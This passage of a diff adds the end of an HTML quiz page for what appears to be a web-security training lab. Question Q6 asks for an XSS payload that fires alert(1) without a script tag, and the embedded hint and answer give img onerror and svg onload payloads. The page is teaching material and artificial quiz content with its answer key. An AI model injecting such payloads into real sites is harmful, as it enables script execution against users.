+          data-solution-rationale="Any tag with an event handler that fires your JS works, e.g. &lt;img src=x onerror=alert(1)&gt; or &lt;svg onload=alert(1)&gt;. &lt;script&gt; alone often won't run when injected via innerHTML, which is why event handlers are the go-to."
+          data-hint="You can't rely on &lt;script&gt; when the payload is written via innerHTML. Use a tag with an event handler that fires, like img + onerror or svg + onload.">
+          <div class="quiz-question">Q6 [Payload]: Write an XSS payload that pops <code>alert(1)</code> without using a <code>&lt;script&gt;</code> tag.</div>
+          <div class="quiz-input-group">
+            <input type="text" class="quiz-input" placeholder="&lt;img src=x onerror=...&gt;" spellcheck="false" autocomplete="off" />
+            <button type="button" class="quiz-submit-btn">Execute</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <div data-site-footer></div>
+
+  <script data-site-root=".." src="../assets/js/site.js"></script>
+  <script src="../assets/js/vendor/qrcode.js"></script>
+  <script src="../assets/js/lab-common.js"></script>
+  <script src="../assets/js/quiz.js"></script>
+</body>
+</html>
